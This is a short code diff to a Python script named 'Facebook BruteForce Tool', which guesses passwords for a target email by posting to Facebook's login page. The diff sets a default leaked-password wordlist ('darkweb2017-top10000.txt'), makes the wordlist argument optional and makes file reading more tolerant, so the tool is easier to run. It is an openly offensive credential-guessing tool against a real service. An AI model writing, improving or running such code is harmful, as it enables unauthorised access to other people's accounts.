@@ -5,8 +5,7 @@ from bs4 import BeautifulSoup
 import sys
 import signal
 
-
-PASSWORD_FILE = ""
+PASSWORD_FILE = "darkweb2017-top10000.txt"
 MIN_PASSWORD_LENGTH = 6
 POST_URL = 'https://www.facebook.com/login.php'
 HEADERS = {
@@ -47,7 +46,7 @@ def is_this_a_password(email, index, password):
 
 
 def read_password_file(password_file):
-    with open(password_file, 'r') as file:
+    with open(password_file, 'r', errors='ignore') as file:
         return [line.strip() for line in file if len(line.strip()) >= MIN_PASSWORD_LENGTH]
 
 
@@ -66,7 +65,7 @@ def main():
     signal.signal(signal.SIGINT, signal_handler)
 
     parser = argparse.ArgumentParser(description='Facebook BruteForce Tool')
-    parser.add_argument('--password-file', dest='password_file', required=True, help='Path to the password file')
+    parser.add_argument('--password-file', dest='password_file', default=PASSWORD_FILE, help='Path to the password file')
     args = parser.parse_args()
 
     PASSWORD_FILE = args.password_file
